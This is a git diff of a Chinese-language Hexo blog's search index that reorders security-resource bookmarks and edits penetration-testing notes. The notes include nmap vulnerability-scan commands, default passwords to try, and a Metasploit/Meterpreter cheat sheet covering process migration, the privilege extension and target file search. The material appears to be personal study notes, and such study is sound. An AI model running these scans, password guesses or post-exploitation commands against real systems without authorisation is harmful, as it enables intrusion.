@@ -54,17 +54,90 @@
       </categories>
   </entry>
   <entry>
+    <title>网站模板</title>
+    <url>/2025/05/01/#%E7%BD%91%E7%AB%99%E6%A8%A1%E6%9D%BF/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
+
+
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
+      <categories>
+        <category>重要</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Apache</title>
+    <url>/2025/05/14/T-Apache/</url>
+    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a><a href="https://httpd.apache.org/">Apache</a></h3><h3 id="Apache-HTTP-Server-Documentation"><a href="#Apache-HTTP-Server-Documentation" class="headerlink" title="Apache HTTP Server Documentation"></a><a href="https://httpd.apache.org/docs/">Apache HTTP Server Documentation</a></h3><br>
+
+
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>Apache HTTP 服务器项目致力于开发和维护一个适用于现代操作系统（包括 UNIX 和 Windows）的开源 HTTP 服务器。该项目的目标是提供一个安全、高效且可扩展的服务器，并提供与当前 HTTP 标准同步的 HTTP 服务。<br><br></p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
+
+
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>工具模板</title>
+    <url>/2025/05/01/#%E5%B7%A5%E5%85%B7%E6%A8%A1%E6%9D%BF/</url>
+    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><br>
+
+
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><br>
+
+
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
+
+
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
+      <categories>
+        <category>重要</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Advanced search operators list</title>
+    <url>/2025/05/13/T-Advanced-search-operators-list/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Advanced-search-operators-list"><a href="#Advanced-search-operators-list" class="headerlink" title="Advanced search operators list"></a><a href="https://github.com/cipher387/Advanced-search-operators-list">Advanced search operators list</a></h3><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>邮箱和即时通讯<br>云存储<br>操作系统<br>搜索引擎<br>社交媒体<br>内容分析<br>编码<br>求职<br>生产力和项目管理<br>密码管理器 物<br>联网搜索引擎<br>市场<br>地图 图片<br>图书馆<br>客户<br>支持<br>新闻&#x2F;RSS<br>数据库<br>工具<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
+]]></content>
+      <categories>
+        <category>网站</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>CVE</title>
+    <url>/2025/05/13/T-CVE/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a><a href="https://www.cve.org/">CVE</a></h3><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>识别、定义和分类公开披露的网络安全漏洞。<br>目前有超过281,000 条CVE 记录可通过上面的下载或关键字搜索访问。<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
+]]></content>
+      <categories>
+        <category>网站</category>
+      </categories>
+  </entry>
+  <entry>
     <title>博客示例</title>
     <url>/2077/07/07/#%E5%8D%9A%E5%AE%A2%E7%A4%BA%E4%BE%8B/</url>
-    <content><![CDATA[<h2 id="侦察（Reconnaissance）"><a href="#侦察（Reconnaissance）" class="headerlink" title="侦察（Reconnaissance）"></a>侦察（Reconnaissance）</h2><p><IP>&#x2F;<HOSTNAME>: 192.0.2.1&#x2F;example.com</p>
+    <content><![CDATA[<p>192.0.2.1<br>example.com</p>
+<h2 id="侦察（Reconnaissance）"><a href="#侦察（Reconnaissance）" class="headerlink" title="侦察（Reconnaissance）"></a>侦察（Reconnaissance）</h2><p>检查页面源代码</p>
 <p>简单密码 admin、administrator、root、toor </p>
-<p>检查页面源代码</p>
 <p>Ping<br>nslookup<br>whois</p>
 <p><a href="https://cyphersun.github.io/2025/05/01/Gobuster/">Gobuster</a></p>
 <ul>
 <li>扫描 URI 目录和文件，DNS 子域，Web 服务器上的虚拟主机名，打开 Amazon S3 存储桶，Google Cloud 存储桶，TFTP 服务器</li>
 </ul>
-<p>nmap<br>-sS 隐蔽扫描</p>
+<p>nmap<br>-sS 隐蔽扫描<br>-sV 探测服务器版本<br>–script vuln 探测漏洞版本</p>
+<p>nmap -sV –script vuln TARGET_IP</p>
 <br>
 
 
@@ -103,51 +176,12 @@
 
 
 <h2 id="行动目标（Actions-on-Objectives）"><a href="#行动目标（Actions-on-Objectives）" class="headerlink" title="行动目标（Actions on Objectives）"></a>行动目标（Actions on Objectives）</h2><br>
+
+
+<p>电脑：</p>
+<p>手机：等小米 16 pro，马上了</p>
+<p>平板：</p>
 ]]></content>
-      <categories>
-        <category>重要</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>工具模板</title>
-    <url>/2025/05/01/#%E5%B7%A5%E5%85%B7%E6%A8%A1%E6%9D%BF/</url>
-    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><br>
-
-
-<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><br>
-
-
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
-
-
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
-      <categories>
-        <category>重要</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Advanced search operators list</title>
-    <url>/2025/05/13/T-Advanced-search-operators-list/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Advanced-search-operators-list"><a href="#Advanced-search-operators-list" class="headerlink" title="Advanced search operators list"></a><a href="https://github.com/cipher387/Advanced-search-operators-list">Advanced search operators list</a></h3><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>邮箱和即时通讯<br>云存储<br>操作系统<br>搜索引擎<br>社交媒体<br>内容分析<br>编码<br>求职<br>生产力和项目管理<br>密码管理器 物<br>联网搜索引擎<br>市场<br>地图 图片<br>图书馆<br>客户<br>支持<br>新闻&#x2F;RSS<br>数据库<br>工具<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
-]]></content>
-      <categories>
-        <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>网站模板</title>
-    <url>/2025/05/01/#%E7%BD%91%E7%AB%99%E6%A8%A1%E6%9D%BF/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
-
-
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
       <categories>
         <category>重要</category>
       </categories>
@@ -168,31 +202,18 @@
       </categories>
   </entry>
   <entry>
-    <title>Chrome Root Store</title>
-    <url>/2025/06/03/T-Chrome-Root-Store/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Chrome-Root-Store"><a href="#Chrome-Root-Store" class="headerlink" title="Chrome Root Store"></a><a href="https://chromium.googlesource.com/chromium/src/+/main/net/data/ssl/chrome_root_store/root_store.md">Chrome Root Store</a></h3><br>
+    <title>Censys</title>
+    <url>/2025/05/13/T-Censys/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Censys"><a href="#Censys" class="headerlink" title="Censys"></a><a href="https://search.censys.io/">Censys</a></h3><h3 id="Introductory-Use-Cases"><a href="#Introductory-Use-Cases" class="headerlink" title="Introductory Use Cases"></a><a href="https://docs.censys.com/docs/ls-introductory-use-cases#/">Introductory Use Cases</a></h3><br>
 
 
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>可信根<br>约束根<br><br></p>
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
+
+
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
 ]]></content>
       <categories>
         <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Apache</title>
-    <url>/2025/05/14/T-Apache/</url>
-    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a><a href="https://httpd.apache.org/">Apache</a></h3><h3 id="Apache-HTTP-Server-Documentation"><a href="#Apache-HTTP-Server-Documentation" class="headerlink" title="Apache HTTP Server Documentation"></a><a href="https://httpd.apache.org/docs/">Apache HTTP Server Documentation</a></h3><br>
-
-
-<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>Apache HTTP 服务器项目致力于开发和维护一个适用于现代操作系统（包括 UNIX 和 Windows）的开源 HTTP 服务器。该项目的目标是提供一个安全、高效且可扩展的服务器，并提供与当前 HTTP 标准同步的 HTTP 服务。<br><br></p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
-
-
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
-      <categories>
-        <category>工具</category>
       </categories>
   </entry>
   <entry>
@@ -213,26 +234,13 @@
       </categories>
   </entry>
   <entry>
-    <title>CVE</title>
-    <url>/2025/05/13/T-CVE/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a><a href="https://www.cve.org/">CVE</a></h3><br>
+    <title>Chrome Root Store</title>
+    <url>/2025/06/03/T-Chrome-Root-Store/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Chrome-Root-Store"><a href="#Chrome-Root-Store" class="headerlink" title="Chrome Root Store"></a><a href="https://chromium.googlesource.com/chromium/src/+/main/net/data/ssl/chrome_root_store/root_store.md">Chrome Root Store</a></h3><br>
 
 
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>识别、定义和分类公开披露的网络安全漏洞。<br>目前有超过281,000 条CVE 记录可通过上面的下载或关键字搜索访问。<br><br></p>
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>可信根<br>约束根<br><br></p>
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
-]]></content>
-      <categories>
-        <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>DuckDuckGo</title>
-    <url>/2025/05/13/T-DuckDuckGo/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="DuckDuckGo"><a href="#DuckDuckGo" class="headerlink" title="DuckDuckGo"></a><a href="https://duckduckgo.com/">DuckDuckGo</a></h3><h3 id="Advanced-Search-Syntax"><a href="#Advanced-Search-Syntax" class="headerlink" title="Advanced Search Syntax"></a><a href="https://duckduckgo.com/duckduckgo-help-pages/results/syntax">Advanced Search Syntax</a></h3><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>改用 DuckDuckGo，私密且免费！<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>
 ]]></content>
       <categories>
         <category>网站</category>
@@ -252,24 +260,22 @@
       </categories>
   </entry>
   <entry>
-    <title>Exploit Database</title>
-    <url>/2025/05/13/T-Exploit-Database/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Exploit-Database"><a href="#Exploit-Database" class="headerlink" title="Exploit Database"></a><a href="https://www.exploit-db.com/">Exploit Database</a></h3><br>
+    <title>DuckDuckGo</title>
+    <url>/2025/05/13/T-DuckDuckGo/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="DuckDuckGo"><a href="#DuckDuckGo" class="headerlink" title="DuckDuckGo"></a><a href="https://duckduckgo.com/">DuckDuckGo</a></h3><h3 id="Advanced-Search-Syntax"><a href="#Advanced-Search-Syntax" class="headerlink" title="Advanced Search Syntax"></a><a href="https://duckduckgo.com/duckduckgo-help-pages/results/syntax">Advanced Search Syntax</a></h3><br>
 
 
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
-
-
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>改用 DuckDuckGo，私密且免费！<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>
 ]]></content>
       <categories>
         <category>网站</category>
       </categories>
   </entry>
   <entry>
-    <title>GitHub</title>
-    <url>/2025/05/13/T-GitHub/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a><a href="https://github.com/">GitHub</a></h3><br>
+    <title>Exploit Database</title>
+    <url>/2025/05/13/T-Exploit-Database/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Exploit-Database"><a href="#Exploit-Database" class="headerlink" title="Exploit Database"></a><a href="https://www.exploit-db.com/">Exploit Database</a></h3><br>
 
 
 <h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
@@ -297,18 +303,18 @@
       </categories>
   </entry>
   <entry>
-    <title>Censys</title>
-    <url>/2025/05/13/T-Censys/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Censys"><a href="#Censys" class="headerlink" title="Censys"></a><a href="https://search.censys.io/">Censys</a></h3><h3 id="Introductory-Use-Cases"><a href="#Introductory-Use-Cases" class="headerlink" title="Introductory Use Cases"></a><a href="https://docs.censys.com/docs/ls-introductory-use-cases#/">Introductory Use Cases</a></h3><br>
+    <title>GnuPG</title>
+    <url>/2025/06/03/T-GnuPG/</url>
+    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="GnuPG"><a href="#GnuPG" class="headerlink" title="GnuPG"></a><a href="https://gnupg.org/">GnuPG</a></h3><h3 id="gpg-manpage"><a href="#gpg-manpage" class="headerlink" title="gpg manpage"></a><a href="https://www.gnupg.org/gph/de/manual/r1023.html">gpg manpage</a></h3><br>
 
 
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>GnuPG 是RFC4880 定义的 OpenPGP 标准（也称为PGP）的完整且免费的实现。GnuPG 允许您加密和签名数据及通信；它具有多功能密钥管理系统，以及用于各种公钥目录的访问模块。GnuPG（也称为GPG）是一个命令行工具，具有易于与其他应用程序集成的功能。它提供了丰富的 前端应用程序和库。GnuPG 还支持 S&#x2F;MIME 和安全 Shell (ssh)。<br><br></p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
 
 
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
-]]></content>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
       <categories>
-        <category>网站</category>
+        <category>工具</category>
       </categories>
   </entry>
   <entry>
@@ -341,6 +347,21 @@
       </categories>
   </entry>
   <entry>
+    <title>GitHub</title>
+    <url>/2025/05/13/T-GitHub/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a><a href="https://github.com/">GitHub</a></h3><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
+
+
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
+]]></content>
+      <categories>
+        <category>网站</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Hashes.com</title>
     <url>/2025/06/04/T-Hashes-com/</url>
     <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="Hashes-com"><a href="#Hashes-com" class="headerlink" title="Hashes.com"></a><a href="https://hashes.com/en/decrypt/hash">Hashes.com</a></h3><h3 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash_identifier"></a><a href="https://hashes.com/en/tools/hash_identifier">hash_identifier</a></h3><br>
@@ -364,36 +385,6 @@
 
 
 <h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>检查您的电子邮件地址是否遭遇数据泄露<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
-]]></content>
-      <categories>
-        <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>GnuPG</title>
-    <url>/2025/06/03/T-GnuPG/</url>
-    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="GnuPG"><a href="#GnuPG" class="headerlink" title="GnuPG"></a><a href="https://gnupg.org/">GnuPG</a></h3><h3 id="gpg-manpage"><a href="#gpg-manpage" class="headerlink" title="gpg manpage"></a><a href="https://www.gnupg.org/gph/de/manual/r1023.html">gpg manpage</a></h3><br>
-
-
-<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>GnuPG 是RFC4880 定义的 OpenPGP 标准（也称为PGP）的完整且免费的实现。GnuPG 允许您加密和签名数据及通信；它具有多功能密钥管理系统，以及用于各种公钥目录的访问模块。GnuPG（也称为GPG）是一个命令行工具，具有易于与其他应用程序集成的功能。它提供了丰富的 前端应用程序和库。GnuPG 还支持 S&#x2F;MIME 和安全 Shell (ssh)。<br><br></p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
-
-
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>LOLBAS</title>
-    <url>/2025/05/13/T-LOLBAS/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="LOLBAS"><a href="#LOLBAS" class="headerlink" title="LOLBAS"></a><a href="https://lolbas-project.github.io/">LOLBAS</a></h3><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
-
-
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
 ]]></content>
       <categories>
@@ -464,26 +455,16 @@
       </categories>
   </entry>
   <entry>
-    <title>Linux man pages</title>
-    <url>/2025/05/10/T-Linux-man-pages/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Linux-man-pages"><a href="#Linux-man-pages" class="headerlink" title="Linux man pages"></a><a href="https://linux.die.net/man/">Linux man pages</a></h3><br>
+    <title>LOLBAS</title>
+    <url>/2025/05/13/T-LOLBAS/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="LOLBAS"><a href="#LOLBAS" class="headerlink" title="LOLBAS"></a><a href="https://lolbas-project.github.io/">LOLBAS</a></h3><br>
 
 
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>手册页分为几个部分。要查看某个部分的 Linux 手册页完整列表，请选择以下其中一个部分：<br>第 1 部分<br>用户命令（介绍）<br>第 2 节<br>系统调用（介绍）<br>第 3 节<br>库函数（介绍）<br>第 4 节<br>特殊文件（介绍）<br>第 5 节<br>文件格式（介绍）<br>第 6 节<br>游戏（介绍）<br>第 7 节<br>惯例与杂项（引言）<br>第 8 节<br>管理和特权命令（介绍）<br>L 区<br>数学库函数<br>第N部分<br>tcl函数<br><br></p>
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
+
+
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
 ]]></content>
-      <categories>
-        <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Let&#39;s Encrypt</title>
-    <url>/2025/05/28/T-Let-s-Encrypt/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Let’s-Encrypt"><a href="#Let’s-Encrypt" class="headerlink" title="Let’s Encrypt"></a><a href="https://letsencrypt.org/">Let’s Encrypt</a></h3><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>Let’s Encrypt 是一家提供免费 TLS 证书的证书颁发机构，帮助网站轻松启用 HTTPS 加密，为每个人打造更安全的互联网。Let’s Encrypt 是非营利组织互联网安全研究小组 (Internet Security Research Group) 的一个项目。<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
       <categories>
         <category>网站</category>
       </categories>
@@ -495,6 +476,19 @@
 
 
 <h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>欢迎来到 LinkedIn，全球最大的职业网络，在全球 200 多个国家和地区拥有超过 10 亿会员。<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
+]]></content>
+      <categories>
+        <category>网站</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Linux man pages</title>
+    <url>/2025/05/10/T-Linux-man-pages/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Linux-man-pages"><a href="#Linux-man-pages" class="headerlink" title="Linux man pages"></a><a href="https://linux.die.net/man/">Linux man pages</a></h3><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>手册页分为几个部分。要查看某个部分的 Linux 手册页完整列表，请选择以下其中一个部分：<br>第 1 部分<br>用户命令（介绍）<br>第 2 节<br>系统调用（介绍）<br>第 3 节<br>库函数（介绍）<br>第 4 节<br>特殊文件（介绍）<br>第 5 节<br>文件格式（介绍）<br>第 6 节<br>游戏（介绍）<br>第 7 节<br>惯例与杂项（引言）<br>第 8 节<br>管理和特权命令（介绍）<br>L 区<br>数学库函数<br>第N部分<br>tcl函数<br><br></p>
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
 ]]></content>
       <categories>
@@ -919,7 +913,7 @@
 <td>终止 Meterpreter 会话</td>
 </tr>
 </tbody></table>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">migrate &lt;PID&gt;</span><br><span class="line">migrate 720</span><br><span class="line"><span class="comment"># &lt;PID&gt;: 1, 2, 3, 4...</span></span><br><span class="line"><span class="comment"># 将 Meterpreter 迁移到另一个 PID 为 720 的进程，但可能会丢失高权限</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">load &lt;Extensions&gt;</span><br><span class="line">load priv</span><br><span class="line"><span class="comment"># &lt;Extensions&gt;: python, priv...</span></span><br><span class="line"><span class="comment"># 把 priv 扩展加载进 Meterpreter，会多出一批与权限/提权相关的命令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">search -f &lt;FILE&gt;</span><br><span class="line">search -f file.txt</span><br><span class="line"><span class="comment"># &lt;FILE&gt;: file.txt...</span></span><br><span class="line"><span class="comment"># 搜索目标系统中 file.txt 的所在位置</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">migrate &lt;PID&gt;</span><br><span class="line">migrate 720</span><br><span class="line"><span class="comment"># &lt;PID&gt;: 1, 2, 3, 4...</span></span><br><span class="line"><span class="comment"># 将 Meterpreter 迁移到另一个 PID 为 720 的进程，但可能会丢失高权限</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">load &lt;Extensions&gt;</span><br><span class="line">load priv</span><br><span class="line"><span class="comment"># &lt;Extensions&gt;: python, priv...</span></span><br><span class="line"><span class="comment"># 把 priv 扩展加载进 Meterpreter，会多出一批与权限/提权相关的命令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">search -f &lt;FILE&gt;</span><br><span class="line">search -f file.txt</span><br><span class="line"><span class="comment"># &lt;FILE&gt;: file.txt, *file* ...</span></span><br><span class="line"><span class="comment"># 搜索目标系统中 file.txt 的所在位置，可以使用 * * 进行模糊匹配搜索</span></span><br></pre></td></tr></table></figure>
 
 
 <h3 id="msfvenom-命令"><a href="#msfvenom-命令" class="headerlink" title="msfvenom 命令"></a>msfvenom 命令</h3><table>
@@ -948,7 +942,9 @@
 <h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="comment"># 启动 msfconsole</span></span><br><span class="line"></span><br><span class="line">search portscan</span><br><span class="line"><span class="comment"># 列出潜在的可用端口扫描模块</span></span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="comment"># 使用 auxiliary/scanner/portscan/tcp 模块</span></span><br><span class="line"></span><br><span class="line">nmap -sS 192.0.2.1</span><br><span class="line"><span class="comment"># 可在 msfconsole 执行 nmap 扫描</span></span><br><span class="line"></span><br><span class="line">search NetBIOS</span><br><span class="line"><span class="comment"># 搜索关于 NetBIOS 的模块</span></span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/netbios/nbname</span><br><span class="line"><span class="comment"># 使用 auxiliary/scanner/netbios/nbname 模块</span></span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 显示选项设置</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts 192.0.2.1</span><br><span class="line"><span class="comment"># 设置目标 IP 为 192.0.2.1</span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line"></span><br><span class="line">back</span><br><span class="line"><span class="comment"># 返回</span></span><br></pre></td></tr></table></figure>
 
 
+
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="comment"># 启动 msfconsole</span></span><br><span class="line"></span><br><span class="line">search http_version</span><br><span class="line"><span class="comment"># 搜索关于 http_version 模块</span></span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/http/http_version </span><br><span class="line"><span class="comment"># 使用 auxiliary/scanner/http/http_version 模块</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhost 192.0.2.1</span><br><span class="line"><span class="comment"># 设置目标 IP 为 192.0.2.1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rport 8000</span><br><span class="line"><span class="comment"># 设置目标端口为 8000</span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 运行</span></span><br></pre></td></tr></table></figure>
+
 
 
